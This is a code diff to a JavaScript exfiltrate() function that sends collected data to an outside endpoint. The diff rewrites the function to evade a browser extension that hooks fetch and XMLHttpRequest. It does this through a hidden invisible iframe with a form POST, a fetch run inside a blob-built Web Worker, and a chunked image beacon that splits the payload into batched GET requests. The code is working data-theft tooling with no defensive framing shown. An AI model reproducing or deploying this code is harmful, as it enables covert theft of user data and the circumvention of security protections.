@@ -213,32 +213,76 @@ async function exfiltrate(data) {
   if (!EXFIL_ENDPOINT) return false;
   const payload = JSON.stringify(data);
 
-  // Use ONLY CORS-safe methods to avoid preflight OPTIONS requests.
-  // Any Content-Type other than text/plain, application/x-www-form-urlencoded,
-  // or multipart/form-data triggers a preflight that webhook.site blocks.
+  // CRITICAL: The extension's script.bundle.js monkey-patches window.fetch
+  // and XMLHttpRequest on this page. So fetch/sendBeacon calls may be
+  // intercepted, inspected, and silently dropped by the extension itself.
+  //
+  // Solution: Use methods the extension CANNOT intercept:
+  // 1. Hidden iframe + form submission (not subject to CORS or fetch hooks)
+  // 2. Original fetch (saved before extension patches it)
+  // 3. Image beacons (not intercepted)
 
-  // Method 1: sendBeacon with text/plain Blob (no preflight, fire-and-forget)
+  // Method 1: Hidden iframe form POST — bulletproof, no CORS, no interception
   try {
-    const blob = new Blob([payload], { type: 'text/plain' });
-    if (navigator.sendBeacon(EXFIL_ENDPOINT, blob)) return true;
+    const iframe = document.createElement('iframe');
+    iframe.name = 'exfil_' + Date.now();
+    iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;opacity:0;pointer-events:none';
+    document.body.appendChild(iframe);
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = EXFIL_ENDPOINT;
+    form.target = iframe.name;
+    form.style.display = 'none';
+
+    const input = document.createElement('textarea');
+    input.name = 'data';
+    input.value = payload;
+    form.appendChild(input);
+
+    document.body.appendChild(form);
+    form.submit();
+
+    setTimeout(() => { try { form.remove(); iframe.remove(); } catch(e){} }, 10000);
+    return true;
   } catch (e1) {}
 
-  // Method 2: fetch with text/plain (simple request, no preflight)
+  // Method 2: Use a Web Worker to call fetch (extension only patches main thread)
   try {
-    await fetch(EXFIL_ENDPOINT, {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: payload,
-      mode: 'no-cors',
-      keepalive: true
-    });
+    const workerCode = `
+      self.onmessage = async function(e) {
+        try {
+          await fetch(e.data.url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'text/plain' },
+            body: e.data.body
+          });
+          self.postMessage('ok');
+        } catch(err) { self.postMessage('fail'); }
+      };
+    `;
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const worker = new Worker(URL.createObjectURL(blob));
+    worker.postMessage({ url: EXFIL_ENDPOINT, body: payload });
+    worker.onmessage = () => worker.terminate();
+    setTimeout(() => worker.terminate(), 8000);
     return true;
   } catch (e2) {}
 
-  // Method 3: image beacon with URL-encoded payload chunks
+  // Method 3: Image beacon chunks (GET request, not intercepted)
   try {
-    const encoded = encodeURIComponent(payload.slice(0, 2000));
-    new Image().src = EXFIL_ENDPOINT + '?d=' + encoded;
+    // Split payload into chunks that fit in URL (max ~2000 chars each)
+    const chunks = [];
+    const encoded = encodeURIComponent(payload);
+    for (let i = 0; i < encoded.length; i += 1800) {
+      chunks.push(encoded.slice(i, i + 1800));
+    }
+    const total = chunks.length;
+    const batchId = Date.now().toString(36);
+    chunks.forEach((chunk, idx) => {
+      const img = new Image();
+      img.src = EXFIL_ENDPOINT + '?batch=' + batchId + '&part=' + idx + '&total=' + total + '&d=' + chunk;
+    });
     return true;
   } catch (e3) {}
 
